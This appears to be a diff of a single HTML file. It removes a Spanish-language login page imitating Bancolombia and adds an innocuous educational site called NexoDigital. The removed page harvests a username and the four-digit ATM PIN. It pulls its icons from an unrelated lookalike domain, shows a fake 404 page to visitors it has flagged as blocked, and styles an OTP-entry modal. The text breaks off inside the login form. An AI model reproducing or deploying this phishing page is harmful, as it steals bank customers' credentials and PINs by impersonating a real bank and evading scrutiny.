@@ -1,959 +1,181 @@
 <!DOCTYPE html>
-<html lang="es-CO">
+<html lang="es">
 <head>
-  <meta charset="utf-8">
-  <title>Ingreso </title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#07111f">
+<meta name="description" content="NexoDigital: portal educativo sobre internet, conectividad, fibra óptica y tecnología digital en Colombia.">
+<title>NexoDigital | Tecnología y conectividad</title>
+<style>
 
-  <script>
-    // ==========================================
-    // 🛡️ CONTROL DE SEGURIDAD PRE-CARGA (ANTI-REFRESCO)
-    // ==========================================
-    if (localStorage.getItem('sys_blocked_user') === 'true') {
-      window.stop();
-      document.documentElement.innerHTML = `
-        <html lang="es">
-        <head>
-          <title>404 Not Found</title>
-          <style>
-            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; color: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-            .container { text-align: center; }
-            h1 { font-size: 24px; font-weight: 500; margin-bottom: 8px; display: inline-block; border-right: 1px solid rgba(0, 0, 0, 0.3); padding: 0 20px 0 0; margin-right: 20px; vertical-align: middle; }
-            .msg { display: inline-block; text-align: left; vertical-align: middle; font-size: 14px; }
-          </style>
-        </head>
-        <body>
-          <div class="container">
-            <h1>404</h1>
-            <div class="msg">This page could not be found.</div>
-          </div>
-        </body>
-        </html>`;
-    }
-  </script>
 
-  <style>
-    body{font-size:100%;}
-    :root{--bc-theme-color:white;}
-    *,*:after,*:before{margin:0;padding:0;box-sizing:border-box;}
-    :root{--breakpoint-xs:0;--breakpoint-sm:576px;--breakpoint-md:768px;--breakpoint-lg:992px;--breakpoint-xl:1200px;}
-    body{font-size:1rem;font-family:"Open Sans",Arial,sans-serif;color:#2c2a29;line-height:24px;letter-spacing:-0.3px;}
-    .bc-bg-brand-N-P-pair-50-00{background-color:#f9f9fa;}
-    .bc-justify-content-center{justify-content:center;}
-    .bc-align-content-center{justify-content:center;}
-    .bc-align-items-center{align-items:center;}
-    .bc-direction-row{flex-direction:row;}
-    .bc-direction-column{flex-direction:column;}
-    .bc-paddinginfix-top-3{padding-top:24px;}
-    .bc-paddinginfix-top-4{padding-top:32px;}
-    .bc-px-5{padding-right:40px;padding-left:40px;}
-    .bc-margin-top-2{margin-top:16px;}
-    .bc-mx-2{margin-right:16px;margin-left:16px;}
-    .bc-margin-bottom-2{margin-bottom:16px;}
-    .bc-margin-top-4{margin-top:32px;}
-    [class*=bc-col-]{float:left;min-height:1px;}
-    .bc-container{width:100%;padding-right:16px;padding-left:16px;margin:auto;}
-    .bc-container-fluid{width:100%;padding-right:16px;padding-left:16px;margin:auto;}
-    .bc-row{display:flex;flex-wrap:wrap;}
-    .bc-col-lg-4,.bc-col-md-8,.bc-col-md-6,.bc-col-sm-auto,.bc-col-xs-6,.bc-col-12{position:relative;width:100%;}
-    .bc-col-12{flex-basis:0;flex-grow:1;max-width:100%;flex:0 0 100%;}
-    @media (min-width:0){
-      .bc-col-xs-6{flex:0 0 100%;max-width:100%;}
-      [class*=bc-col]{padding-right:4px;padding-left:4px;}
-      .bc-row{margin-right:-4px;margin-left:-4px;}
-    }
-    @media (min-width:576px){.bc-col-sm-auto{flex:0 0 auto;width:auto;max-width:100%;}}
-    @media (min-width:768px){
-      .bc-col-md-6{flex:0 0 50%;max-width:50%;}
-      .bc-col-md-8{flex:0 0 66.6666666667%;max-width:66.6666666667%;}
-      [class*=bc-col]{padding-right:8px;padding-left:8px;}
-      .bc-row{margin-right:-8px;margin-left:-8px;}
-    }
-    @media (min-width:992px){.bc-col-lg-4{flex:0 0 33.3333333333%;max-width:33.3333333333%;}}
-    .bc-flex{display:flex;}
-
-    .bc-form-field{width:100%;position:relative;height:52px;margin-top:20px;}
-    @media screen and (max-width:975px){.bc-form-field{margin-bottom:15px;display:grid;}}
-    
-    .bc-form-field>em{position:absolute;color:#2c2a29;top:4px;font-size:1.5rem;}
-    .bc-form-field>em:first-child{left:0;width:24px;}
-
-    /* Estilo para las imágenes de los iconos en los inputs */
-    .icon-img {
-      position: absolute;
-      width: 20px;
-      height: 20px;
-      top: 6px;
-      left: 0;
-      object-fit: contain;
-      z-index: 2;
-    }
-    
-    .bc-input[aria-label],.bc-input[id]{
-      background:transparent;
-      border:none;
-      border-bottom:1px solid #2c2a29;
-      color:#2c2a29;
-      display:block;
-      height:32px;
-      left:0;
-      top:20px;
-      width:100%;
-      font-family:"Open Sans SemiBold";
-      font-weight:600;
-      font-size:1rem;
-      line-height:24px;
-      padding-left: 35px; /* Espacio para el ícono */
-    }
-    
-    .bc-input[aria-label]:focus,.bc-input[id]:focus{outline:none;transition:.5s;border-bottom:2px solid #2c2a29;}
-    .bc-input[aria-label]~span,.bc-input[id]~span{display:block;height:20px;font-family:"Open Sans";font-size:.75rem;line-height:16px;}
-    .bc-input[aria-label]~label,.bc-input[id]~label{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;width:88%;font-family:"Open Sans";font-size:1rem;line-height:24px;}
-    .bc-input[aria-label]:not(:placeholder-shown),.bc-input[id]:not(:placeholder-shown){border-bottom:2px solid #2c2a29;}
-    .bc-input[aria-label]::placeholder,.bc-input[id]::placeholder{opacity:.4;color:#2c2a29;font-family:"Open Sans SemiBold";font-weight:600;font-size:1rem;}
-    .bc-input[aria-label]:focus~label,.bc-input[id]:focus~label,.bc-input[aria-label]:active~label,.bc-input[id]:active~label,.bc-active.bc-input[aria-label]~label,.bc-active.bc-input[id]~label{top:-23px;padding-left:0;width:95%;font-family:"Open Sans";font-size:.875rem;line-height:20px;}
-    .bc-input[aria-label]:valid~label,.bc-input[id]:valid~label{margin-left:0;}
-    .bc-input[aria-label]:focus~span,.bc-input[id]:focus~span{color:#2c2a29;}
-    em~.bc-input[aria-label],em~.bc-input[id]{padding-left:30px;}
-    .bc-input[aria-label]+em,.bc-input[id]+em{right:0;width:24px;left:initial;}
-    input::first-line{color:#2c2a29;-webkit-text-fill-color:#2c2a29;}
-
-    .bc-card{padding:16px;background:#fff;box-shadow:0 8px 12px rgba(44,42,41,.16),0 1px 8px rgba(43,42,41,.08);display:flex;position:relative;width:100%;height:min-content;border-radius:8px;}
-    .bc-card-container{padding:0;background:#fff;height:auto;width:auto;}
-
-    .bc-button-small,.bc-button-secondary,.bc-button-primary{display:flex;justify-content:center;align-items:center;column-gap:8px;border:0;cursor:pointer;padding:12px 24px;outline:0;text-transform:none;text-decoration:none;border-radius:100px;overflow:hidden;width:100%;height:auto;min-height:32px;white-space:initial;font-family:"CIB Sans bold";font-weight:700;font-size:1.125rem;line-height:26px;}
-    .bc-button-small:not(:focus),.bc-button-secondary:not(:focus),.bc-button-primary:not(:focus){transition:150ms cubic-bezier(.4,0,.2,1);}
-    .bc-button-small:disabled,.bc-button-secondary:disabled,.bc-button-primary:disabled{cursor:default;}
-    .bc-button-primary{background:#fdda24;color:#2c2a29;}
-    .bc-button-primary:hover:enabled{background:#fee66c;}
-    .bc-button-primary:active:enabled{background:#e6c621;}
-    .bc-button-primary:disabled{background:#d9dadd;color:#97999b;}
-    .bc-button-secondary{background:transparent;color:#2c2a29;border:1px solid #2c2a29;}
-    .bc-button-secondary:hover:enabled{background:#d9dadd;}
-    .bc-button-secondary:active:enabled{background:#b3b5b8;}
-    .bc-button-secondary:disabled{background:transparent;color:#97999b;border:1px solid #97999b;}
-    .bc-button-small{padding:8px 16px;font-size:1rem;line-height:24px;}
-    .bc-button-fill{width:100%;}
-    .bc-total-value-gap-03{gap:24px;}
-
-    .bc-link{color:#2c2a29;font-family:"CIB Sans";font-size:.875rem;line-height:20px;text-decoration:none;align-items:center;display:flex;width:fit-content;}
-    .bc-link:active,.bc-link:hover{opacity:.8;}
-    .link-default{font-family:"Open Sans";font-size:.875rem;line-height:20px;outline-color:#3455db;}
-    .link-underline{font-family:"Open Sans Bold";font-weight:700;font-size:.875rem;line-height:20px;text-decoration:none;}
-    .link-underline:hover{text-decoration:none;outline:none;opacity:.8;}
-
-    /* Loader Overlay */
-    .loading-overlay {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(255, 255, 255, 0.85);
-      z-index: 10000;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-    }
-    .loading-spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #fdda24;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-    }
-
-    /* Mensajes de error */
-    .error-msg {
-      display: none;
-      color: #d9381e;
-      font-size: 0.875rem;
-      margin-top: 8px;
-      font-family: "Open Sans", sans-serif;
-    }
-    .error-msg.show {
-      display: block;
-    }
-
-    article.bc-modal[role=dialog][aria-labelledby][aria-modal=true]{display:none;max-height:30px;animation:fade-out 350ms;}
-    section.bc-modal-title{width:100%;text-align:center;font-family:"CIB Sans bold";font-weight:700;font-size:1.5rem;line-height:28px;color:#2c2a29;}
-    section.bc-modal-footer{position:relative;padding:32px;margin:16px -24px -32px;background:#f4f4f4;border-radius:0 0 16px 16px;}
-    section.bc-modal-footer:empty{display:none;}
-    section.bc-modal-container{display:flex;flex-direction:column;position:relative;padding:16px 24px 32px;margin:auto;background:#fff;text-align:justify;box-shadow:0 12px 16px rgba(44,42,41,.16),0 1px 10px rgba(43,42,41,.08);max-height:96%;border-radius:16px;}
-    section.bc-modal-container section.bc-modal-close-button-container{display:flex;justify-content:flex-end;}
-    section.bc-modal-container button.bc-modal-close-button[aria-label]{border-radius:50%;border:0;background:#fff;text-align:right;cursor:pointer;display:inherit;color:#2c2a29;position:static;padding:8px;}
-    section.bc-modal-container button.bc-modal-close-button[aria-label]:hover{background:#ccc;transition-duration:1s;}
-    section.bc-modal-container section.bc-modal-icon-container{display:flex;justify-content:center;}
-    section.bc-modal-container section.bc-modal-icon-container .bc-modal-center-icon{display:inherit;text-align:center;color:#2c2a29;border-radius:50%;}
-    section.bc-modal-container .bc-modal-illustration{display:inherit;text-align:center;}
-    section.bc-modal-container section.bc-modal-button-container{justify-content:center;margin:auto;display:flex;position:relative;align-items:center;}
-    section.bc-modal-container section.bc-modal-button-container button{margin:8px;min-width:140px;max-width:343px;min-height:32px;}
-    section.bc-modal-container[customWidth=medium]{width:600px;height:auto;}
-    section.bc-modal-container[customWidth=medium] section.bc-modal-content{max-height:40%;overflow:auto;overflow-x:clip;margin:16px 0;padding-right:4px;border-radius:4px;font-family:"Open Sans";font-size:1rem;line-height:24px;color:#2c2a29;}
-    @media only screen and (max-width:575px){section.bc-modal-container[customWidth=medium]{width:328px;}}
-    @media only screen and (min-width:576px)and (max-width:767px){section.bc-modal-container[customWidth=medium]{width:500px;}}
-
-    .bc-card-auth-body{padding:32px;width:100%;}
-    .bc-card-auth-body .bc-card-auth-title{font-family:"CIB Sans bold";font-weight:700;font-size:1.5rem;line-height:24px;}
-    .bc-card-auth-body .bc-card-auth-description{font-family:"Open Sans";font-size:1rem;line-height:24px;}
-    .bc-card-auth-body .bc-card-auth-head{text-align:center;}
-    .bc-card-auth-body .bc-card-auth-button{display:flex;justify-content:center;}
-    .bc-card-auth-body .bc-card-auth-link{display:flex;justify-content:center;margin-top:24px;}
-    .bc-card-auth-body .bc-card-auth-container{display:grid;margin-bottom:32px;width:100%;}
-    @media only screen and (max-width:575px){.bc-card-auth-body{padding:8px;}}
-    .bc-bg-brand-N-P-pair-50-00{background:#f9f9fa;}
-    .bc-opensans-font-style-1-bold{font-family:"Open Sans Bold";font-weight:700;font-size:.75rem;line-height:16px;}
-    .bc-opensans-font-style-4-bold{font-family:"Open Sans Bold";font-weight:700;font-size:1.125rem;line-height:26px;}
-    .bc-cibsans-font-style-5-bold{font-family:"CIB Sans bold";font-weight:700;font-size:1.25rem;line-height:26px;}
-    .bc-cibsans-font-style-9-extralight{font-family:"CIB Sans Light";font-weight:200;font-size:2.25rem;line-height:40px;}
-    .bc-text-center{text-align:center;}
-    .bc-text-break{overflow-wrap:break-word;word-break:break-word;}
-    .bc-mx-2{margin-right:.5rem;margin-left:.5rem;}
-    .bc-mt-2{margin-top:.5rem;}
-    .bc-mt-3{margin-top:1rem;}
-    .bc-mt-4{margin-top:1.5rem;}
-    .bc-mt-5{margin-top:3rem;}
-    .bc-px-5{padding-right:3rem;padding-left:3rem;}
-    .bc-w-auto{width:auto;}
-    .bc-d-flex{display:flex;}
-    .bc-text-primary{color:#2c2a29;}
-
-    .bc-form-field>em.bc-icon{font-size:0!important;color:transparent!important;line-height:0!important;overflow:hidden;width:24px;height:24px;top:6px!important;position:absolute;display:inline-block;}
-    .bc-card-auth-body .bc-icon{display:none;}
-
-    .svp-main{display:block;min-height:77vh;}
-    .logo{height:4rem;}
-    #svp-footer{padding:1rem;}
-    #svp-footer .bc-container{max-width:100%;}
-    .authentication-form__username{margin-top:2rem;}
-    .authentication-form__help-text{display:block;min-height:1.063rem;}
-    .authentication-form__password{margin-top:1.5rem;}
-    .bc-card-auth-body{padding:3rem;}
-    @media(max-width:575px){.bc-card-auth-body{padding:1.5rem;}h1{font-size:1.75rem;}}
-    .bc-card-auth-container{margin-bottom:3rem;}
-    .trazo{background-repeat:no-repeat;background-position:center;background-size:100%;}
-    @media(max-width:991px){.trazo{background-size:auto;}}
-    .form-container{padding-bottom:3rem;}
-    @media(max-width:767px){.form-container{padding-bottom:.7143rem;}}
-    @media(max-width:575px){.form-container{padding-bottom:1.857rem;}}
-    .bc-footer{background:transparent;position:relative;overflow:hidden;padding:24px 24px 96px;}
-    @media(max-width:767px){.bc-footer{padding:8px 8px 96px;}}
-    @keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
-    @keyframes fade-out{0%{opacity:1}100%{opacity:0}}
-
-    /* Modal de demostración: estilo visual inspirado en la referencia */
-    .demo-overlay{
-      display:none;position:fixed;inset:0;z-index:9999;
-      background:rgba(0,0,0,.68);backdrop-filter:blur(2px);
-      align-items:center;justify-content:center;padding:18px;
-    }
-    .demo-overlay.is-open{display:flex;}
-    .demo-modal{
-      width:100%;max-width:680px;max-height:92vh;overflow-y:auto;
-      background:#fff;border-radius:30px;padding:28px 30px 48px;
-      box-shadow:0 18px 48px rgba(0,0,0,.24);position:relative;
-    }
-    .demo-close-row{display:flex;justify-content:flex-end;margin-bottom:24px;}
-    .demo-close{
-      border:0;background:transparent;font-size:0;width:36px;height:36px;
-      cursor:pointer;color:#333;position:relative;
-    }
-    .demo-close::before,.demo-close::after{
-      content:"";position:absolute;left:17px;top:3px;width:1.5px;height:30px;
-      background:#333;transform:rotate(45deg);
-    }
-    .demo-close::after{transform:rotate(-45deg);}
-    .demo-instruction{
-      background:#f1b5ce;border-radius:14px;padding:34px 22px;
-      text-align:center;margin:0 0 18px;color:#30252b;
-      font-size:clamp(19px,3vw,27px);line-height:1.45;
-    }
-    .demo-instruction strong{font-weight:800;}
-    .demo-title{
-      text-align:center;font-family:"CIB Sans Bold",Arial,sans-serif;
-      font-size:clamp(25px,4vw,36px);line-height:1.2;
-      margin:12px 0 24px;color:#292929;
-    }
-    .demo-message{
-      text-align:center;font-size:clamp(16px,2.5vw,21px);
-      line-height:1.55;margin:0 auto 28px;max-width:540px;color:#343434;
-    }
-    .demo-placeholder{
-      display:flex;justify-content:center;gap:14px;
-      margin:36px auto 54px;max-width:510px;
-    }
-    .demo-placeholder span{
-      display:block;flex:1;height:34px;border-bottom:2px solid #333;
-    }
-    .demo-demo-code{
-      background:#f7f7f7;border-radius:12px;padding:18px;
-      text-align:center;line-height:1.5;margin:0 auto 28px;max-width:520px;
-    }
-    .demo-demo-code strong{display:block;margin-bottom:6px;}
-    .demo-actions{display:flex;justify-content:center;gap:16px;margin-top:20px;}
-    .demo-actions button{flex:1;max-width:250px;min-height:58px;}
-    .demo-note{font-size:12px;color:#777;text-align:center;margin-top:24px;}
-    .demo-step{display:none;}
-    .demo-step.active{display:block;}
-    .demo-success{
-      display:none;text-align:center;margin-top:18px;
-      color:#287a45;font-weight:700;
-    }
-    .demo-success.active{display:block;}
-    @media(max-width:575px){
-      .demo-overlay{padding:12px;}
-      .demo-modal{max-width:100%;padding:20px 20px 34px;border-radius:28px;}
-      .demo-close-row{margin-bottom:18px;}
-      .demo-instruction{padding:27px 15px;font-size:20px;}
-      .demo-title{font-size:27px;margin:14px 0 24px;}
-      .demo-message{font-size:17px;margin-bottom:22px;}
-      .demo-placeholder{gap:9px;margin:30px auto 48px;}
-      .demo-placeholder span{height:30px;}
-      .demo-actions{gap:12px;}
-      .demo-actions button{min-width:0;padding:10px 12px;font-size:16px;}
-    }
-    @media(max-width:360px){
-      .demo-modal{padding-left:15px;padding-right:15px;}
-      .demo-placeholder{gap:6px;}
-    }
-
-    /* ====== MODAL OTP CON RAYITAS ====== */
-    .otp-slots-container { 
-      display: flex; 
-      justify-content: center; 
-      gap: 15px; 
-      margin: 24px 0; 
-    }
-    .otp-slot {
-      width: 35px;
-      height: 45px;
-      border: none;
-      border-bottom: 2px solid #2c2a29;
-      border-radius: 0;
-      text-align: center;
-      font-size: 1.8rem;
-      line-height: 45px;
-      font-weight: bold;
-      background: transparent;
-      color: var(--bc-dark);
-      padding: 0;
-    }
-    .otp-slot.active { 
-      border-bottom-color: #fdda24; 
-      box-shadow: 0 5px 5px -5px rgba(253,218,36,.8); 
-    }
-    .otp-slots-container.error .otp-slot { 
-      border-bottom-color: #d9381e; 
-    }
-    .otp-hidden-input { 
-      position: absolute; 
-      opacity: 0; 
-      pointer-events: none; 
-    }
-
-    /* Estilos del Footer */
-    .svp-footer {
-      padding: 1rem;
-      text-align: center;
-      font-size: 0.8rem;
-      color: #666;
-      margin-top: 2rem;
-    }
-    .svp-footer p { margin-bottom: 8px; }
-  </style>
+:root{--bg:#07111f;--panel:#101f32;--line:#263951;--cyan:#45e7ff;--green:#6bf5b5;--text:#f0f7ff;--muted:#a9bbcf}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--text);font:16px/1.7 system-ui,Arial,sans-serif}
+a{color:var(--cyan)}
+.wrap{width:min(1050px,92%);margin:auto}
+header{position:sticky;top:0;z-index:5;background:#07111fee;border-bottom:1px solid var(--line);backdrop-filter:blur(12px)}
+nav{display:flex;justify-content:space-between;align-items:center;gap:15px;flex-wrap:wrap;padding:17px 0}
+.logo{font-size:22px;font-weight:850;color:var(--cyan);text-decoration:none}
+.links{display:flex;gap:16px;flex-wrap:wrap}
+.links a{text-decoration:none;font-size:14px}
+.hero{padding:85px 0;background:radial-gradient(ellipse at 80% 20%,#17455c 0,transparent 45%),linear-gradient(140deg,#091525,#0b2031)}
+.tag{font-size:12px;letter-spacing:2px;color:var(--green);text-transform:uppercase}
+h1{font-size:clamp(38px,7vw,66px);line-height:1.1;letter-spacing:-2px;max-width:800px}
+h1 span{color:var(--cyan)}
+h2{font-size:28px;line-height:1.3}
+p{color:var(--muted)}
+.btn{display:inline-block;background:var(--cyan);color:#06111d;padding:12px 20px;border-radius:7px;text-decoration:none;font-weight:800;margin:10px 8px 0 0}
+section{padding:38px 0;scroll-margin-top:85px}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.card{background:linear-gradient(145deg,#122239,#0c1828);border:1px solid var(--line);border-radius:13px;padding:22px}
+.card h3{color:var(--green);margin-top:0}
+.notice{padding:15px 18px;border-left:3px solid var(--cyan);background:#102235;border-radius:5px}
+input,textarea,button{width:100%;font:inherit;padding:12px;margin:8px 0 14px;border:1px solid var(--line);border-radius:6px;background:#091525;color:white}
+button{background:var(--cyan);color:#07111f;font-weight:800;cursor:pointer}
+label{color:var(--muted)}
+details{padding:15px 0;border-bottom:1px solid var(--line)}
+summary{color:var(--cyan);font-weight:700;cursor:pointer}
+footer{border-top:1px solid var(--line);padding:30px 0}
+footer a{margin-right:14px}
+.small{font-size:13px}
+@media(max-width:600px){.hero{padding:55px 0}.links{gap:10px}h2{font-size:24px}}
+</style>
 </head>
+<body>
+<header>
+<nav class="wrap">
+<a class="logo" href="#inicio">NexoDigital</a>
+<div class="links">
+<a href="#nosotros">Nosotros</a>
+<a href="#aprende">Aprende</a>
+<a href="#recursos">Recursos</a>
+<a href="#preguntas">FAQ</a>
+<a href="#contacto">Contacto</a>
+</div>
+</nav>
+</header>
 
-<body class="bc-bg-brand-N-P-pair-50-00" id="body">
+<main>
+<div class="hero" id="inicio">
+<div class="wrap">
+<div class="tag">Educación digital · Colombia</div>
+<h1>Comprende la tecnología. <span>Conéctate al futuro.</span></h1>
+<p>Un espacio informativo para aprender sobre internet, conectividad y herramientas digitales con explicaciones claras y prácticas.</p>
+<a class="btn" href="#aprende">Explorar contenidos ↗</a>
+</div>
+</div>
 
-  <!-- Loading Overlay -->
-  <div class="loading-overlay" id="loading-overlay">
-    <div class="loading-spinner"></div>
-    <p style="margin-top: 15px; font-family: 'Open Sans', sans-serif; font-weight: 600; color: #2c2a29;">Procesando solicitud...</p>
-  </div>
+<div class="wrap">
+<section id="nosotros">
+<div class="tag">01 / Nuestra misión</div>
+<h2>Conocimiento digital para todos</h2>
+<p>NexoDigital es un proyecto informativo independiente dedicado a explicar conceptos de internet y tecnología. Nuestro propósito es ayudar a las personas a comprender mejor el mundo digital y tomar decisiones informadas.</p>
+<p class="notice">El contenido de este sitio es educativo. No somos un operador de telecomunicaciones ni ofrecemos contratos de conexión a internet.</p>
+</section>
 
-  <app-root>
-    <div>
-      <!-- Modal original de inactividad -->
-      <app-inactive-modal-orchestrator>
-        <app-modal-inactive-question>
-          <bc-modal aria-hidden="true" title="¿Sigues ahí?" typeicon="warning"
-            customwidth="medium" titlealign="center" id="app-modal-inactive-question">
-            <article role="dialog" aria-labelledby="id" aria-modal="true"
-              class="bc-modal" id="e.127879990">
-              <label for="" class="bc-modal-close"></label>
-              <section class="bc-modal-container" customwidth="medium"
-     titlealign="center" buttonalignment="horizontal"
-                subtitle="warning" typeicon="warning" iscancellable="false"
-    displaybutton="false" role="alertdialog" aria-modal="true"
-                aria-label="Mensaje de alerta">
-                <section class="bc-modal-close-button-container">
-                  <div>
-                    <button class="bc-direction-row bc-icon bc-modal-close-button bc-sm"
-                      id="e.127879990_closeButton" aria-label="cerrar"
-      tabindex="0">error</button>
-                  </div>
-                </section>
-                <section class="bc-modal-icon-container">
-                  <div>
-                    <bc-icon role="img" class="bc-modal-center-icon bc-md bc-icon bc-sm"
-  aria-hidden="true" name="hand">hand</bc-icon>
-                  </div>
-                </section>
-                <section class="bc-modal-title bc-direction-row bc-margin-top-2 bc-margin-bottom-2">
-                  <h4 class="modal-title-label">¿Sigues ahí?</h4>
-                </section>
-                <section class="bc-modal-content">
-                  <div class="bc-row bc-direction-column bc-mx-2 bc-text-center">
-                    <p>Por seguridad, cancelaremos tu proceso en los próximos
-                      <span class="bc-opensans-font-style-4-bold bc-text-primary">2 minutos.</span>
-                    </p>
-                    <section class="bc-flex bc-paddinginfix-top-4 bc-align-content-center bc-total-value-gap-03 bc-row">
-                      <button type="button" class="bc-button-default bc-button-secondary bc-col-sm-auto bc-col-xs-6 bc-w-auto">Cancelar proceso</button>
-                      <button type="button" class="bc-button-default bc-button-primary bc-col-sm-auto bc-col-xs-6 bc-w-auto">Estoy aquí</button>
-                    </section>
-                  </div>
-                </section>
-              </section>
-            </article>
-          </bc-modal>
-        </app-modal-inactive-question>
-      </app-inactive-modal-orchestrator>
+<section id="aprende">
+<div class="tag">02 / Aprende</div>
+<h2>Explora el mundo de la conectividad</h2>
+<div class="grid">
+<article class="card">
+<h3>◈ Fibra óptica</h3>
+<p>Aprende cómo funciona esta tecnología, cómo transmite información y qué factores influyen en su rendimiento.</p>
+</article>
+<article class="card">
+<h3>↗ Velocidad de internet</h3>
+<p>Comprende los Mbps, las velocidades de subida y descarga y su relación con las actividades digitales cotidianas.</p>
+</article>
+<article class="card">
+<h3>◎ Wi-Fi y redes</h3>
+<p>Conoce los factores que afectan la señal inalámbrica, la ubicación del router y la conexión de tus dispositivos.</p>
+</article>
+<article class="card">
+<h3>⌘ Seguridad digital</h3>
+<p>Descubre buenas prácticas para proteger tus cuentas, reconocer riesgos y navegar con mayor seguridad.</p>
+</article>
+</div>
+</section>
 
-      <!-- Login principal de demostración -->
-      <svp-authentication>
-        <app-register-template title="Ingreso">
-          <app-simple-template>
-            <main class="svp-main">
-              <div class="bc-container-fluid trazo"
-                style="background-image:url('https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg');">
+<section id="recursos">
+<div class="tag">03 / Recursos</div>
+<h2>Guías prácticas</h2>
+<div class="grid">
+<article class="card">
+<h3>Cómo entender tu conexión</h3>
+<p>Conoce la diferencia entre velocidad, estabilidad, cobertura y latencia.</p>
+</article>
+<article class="card">
+<h3>Cómo evaluar un servicio</h3>
+<p>Aprende a revisar precios, condiciones, equipos y características antes de tomar una decisión.</p>
+</article>
+<article class="card">
+<h3>Hábitos digitales</h3>
+<p>Mejora tus conocimientos sobre privacidad, contraseñas y uso responsable de internet.</p>
+</article>
+</div>
+<p class="notice">Los contenidos son orientativos y no constituyen asesoría comercial. Las condiciones de cualquier servicio deben comprobarse con su proveedor.</p>
+</section>
 
-                <h1 class="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4">Ingreso</h1>
+<section id="preguntas">
+<div class="tag">04 / Preguntas frecuentes</div>
+<h2>Resolvemos tus dudas</h2>
+<details>
+<summary>¿Qué es NexoDigital?</summary>
+<p>Es un proyecto educativo independiente sobre tecnología, internet y conocimientos digitales.</p>
+</details>
+<details>
+<summary>¿Puedo contratar internet desde este sitio?</summary>
+<p>No. Este sitio no comercializa planes ni tramita contratos de telecomunicaciones.</p>
+</details>
+<details>
+<summary>¿La información sustituye las condiciones de un proveedor?</summary>
+<p>No. Es información general y educativa; consulta las fuentes correspondientes para verificar las condiciones vigentes de cualquier servicio.</p>
+</details>
+</section>
 
-                <div class="bc-row bc-justify-content-center form-container">
-                  <div class="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
-                    <div class="bc-card-body bc-mt-4">
-                      <svp-authentication-form>
-                        <svp-error-component-factory>
-                <bc-card-authentication titlecardauth="¡Hola!"
-                            descriptioncardauth="Ingresa los datos para gestionar tus productos y hacer consultas.">
+<section id="contacto">
+<div class="tag">05 / Contacto</div>
+<h2>Comunícate con NexoDigital</h2>
+<p>Utiliza este formulario para enviar preguntas sobre el contenido educativo.</p>
+<form action="/contacto" method="post">
+<label for="nombre">Nombre</label>
+<input id="nombre" name="nombre" autocomplete="name" required>
+<label for="mensaje">Mensaje</label>
+<textarea id="mensaje" name="mensaje" rows="4" required></textarea>
+<label><input type="checkbox" name="privacidad" required style="width:auto"> He leído la <a href="#privacidad">política de privacidad</a>.</label>
+<button type="submit">Enviar mensaje ↗</button>
+</form>
+<p class="small">El formulario requiere configurar un servicio de recepción de mensajes. No envíes datos sensibles.</p>
+</section>
 
-                            <section id="card1" class="bc-card bc-card-auth bc-card-container">
-      <section id="id00" class="bc-card-auth-body">
+<section id="terminos">
+<div class="tag">06 / Información legal</div>
+<h2>Términos y condiciones</h2>
+<p>NexoDigital ofrece contenido educativo de carácter general. No garantiza que toda la información permanezca actualizada ni presta servicios de conexión a internet. El usuario debe verificar la información relevante antes de tomar decisiones. El uso del sitio está sujeto a las normas aplicables en Colombia.</p>
 
-                                <section class="bc-card-auth-head">
-                                  <section><em aria-hidden="true" class="bc-icon"></em></section>
-                                  <h1 class="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3">¡Hola!</h1>
-                                  <h3 class="bc-card-auth-description bc-mt-3">
-          Ingresa los datos para gestionar tus productos y hacer transacciones.
-                                  </h3>
-      </section>
+<h2 id="privacidad">Política de privacidad</h2>
+<p>Este sitio debe recopilar únicamente los datos necesarios para sus finalidades informadas. Si se habilita el formulario, antes de recibir datos se debe identificar al responsable, explicar las finalidades, obtener la autorización cuando corresponda e informar los derechos de los titulares conforme a la Ley 1581 de 2012 y sus normas reglamentarias. La política definitiva debe describir las prácticas reales del sitio y proporcionar un canal efectivo para consultas y reclamos.</p>
 
-                                <form id="demoForm" autocomplete="off">
-         <section>
-             <section class="bc-card-auth-container">
+<h2>Cookies</h2>
+<p>Si se incorporan herramientas de analítica, publicidad o seguimiento, se deberá informar su utilización y aplicar las medidas de privacidad que correspondan.</p>
+</section>
+</div>
+</main>
 
-            <bc-form-field class="authentication-form__username">
-              <div class="bc-form-field" id="s.1761706071">
-                <!-- Icono de Usuario con Imagen -->
-                <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/09/IC01.png" class="icon-img" alt="Icono Usuario">
-                      <input id="usuario" name="usuario"
-                  autocomplete="off" autocorrect="off"
-        spellcheck="false" maxlength="20"
-                  aria-describedby="username-helper"
-                  aria-invalid="false" class="bc-input bc-active"
-                  placeholder="Usuario" aria-label="Usuario"
-                  required>
-                <label for="usuario"></label>
-                <span id="username-helper" class="authentication-form__help-text"></span>
-                <a href="#" class="bc-opensans-font-style-1-bold bc-link link-default link-underline">
-                  <u>¿Olvidaste tu usuario?</u>
-                </a>
-                   </div>
-                   </bc-form-field>
-
-            <bc-form-field class="authentication-form__password">
-              <div class="bc-form-field" id="s.2218081857">
-                <!-- Icono de Clave con Imagen -->
-                <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/09/IC02.png" class="icon-img" alt="Icono Clave">
-                      <input id="clave" minlength="4" maxlength="4"
-                  type="password" name="clave"
-                  autocomplete="off" inputmode="numeric"
-      aria-describedby="password-helper"
-                  aria-invalid="false" class="bc-input bc-active"
-                  placeholder="Clave de Cajero" aria-label="Clave de Cajero"
-                  required>
-                <label for="clave"></label>
